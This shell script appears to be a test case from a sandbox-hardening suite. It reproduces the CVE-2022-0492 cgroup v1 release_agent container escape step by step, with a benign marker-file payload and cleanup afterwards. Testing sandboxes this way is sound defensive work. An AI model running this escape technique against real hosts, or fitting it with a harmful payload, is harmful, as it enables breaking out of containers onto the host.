#!/bin/sh
# id: 06-cgroup-release-agent
# title: mount cgroup v1 and set release_agent (CVE-2022-0492 style)
# class: kernel-surface
# expect: blocked
# timeout: 20s
#
# Imitates: CVE-2022-0492: a container with CAP_SYS_ADMIN mounts a cgroup
# v1 hierarchy (rdma or memory, often unused and so unguarded), writes its
# own release_agent, creates a child cgroup with notify_on_release=1, puts
# a process in it that then exits, so the child empties and its release
# fires -- on a vulnerable host that runs release_agent as the host, not
# as the sandbox. The payload only creates a marker file, and the old
# release_agent value is written back afterwards.

# The agent is run by the kernel without a shell, as a path on the host, so
# the payload has to be a script file. RF_SANDBOX_ROOT (optional, set by a
# harness that knows where the sandbox root lives on the host) lets the
# agent path resolve there. Without it the case can still show the write
# is possible (EXPOSED) but cannot prove the agent would run.

result="BLOCKED cgroup v1 controller unavailable"
mnt=/tmp/rf-cgroup-$$
agent=/tmp/rf-agent-$$.sh
mkdir -p "$mnt"

mounted=""
for ctrl in rdma memory; do
	if mount -t cgroup -o "$ctrl" cgroup "$mnt" 2>/dev/null; then
		mounted="$ctrl"
		break
	fi
done

if [ -n "$mounted" ]; then
	result="EXPOSED cgroup v1 ($mounted) mountable from inside the sandbox"
	ra="$mnt/release_agent"
	if [ -w "$ra" ]; then
		old=$(cat "$ra" 2>/dev/null)
		printf '#!/bin/sh\necho x > %s\n' "$RF_HOST_MARKER_PATH" >"$agent"
		chmod +x "$agent"
		if echo "${RF_SANDBOX_ROOT:-}$agent" >"$ra" 2>/dev/null; then
			child="$mnt/rf-child"
			mkdir -p "$child"
			echo 1 >"$child/notify_on_release" 2>/dev/null
			# A short-lived child joins the cgroup and exits, which empties
			# it and fires the release. This shell never leaves its own
			# cgroup, so its pids/memory accounting stays intact.
			sh -c "echo \$\$ >'$child/cgroup.procs'" 2>/dev/null
			sleep 1
			rmdir "$child" 2>/dev/null
			result="EXPOSED release_agent writable on cgroup v1 ($mounted); the harness checks whether it fired"
		fi
		echo "$old" >"$ra" 2>/dev/null
	fi
	umount "$mnt" 2>/dev/null
fi
rmdir "$mnt" 2>/dev/null
rm -f "$agent"

echo "RESULT: $result"
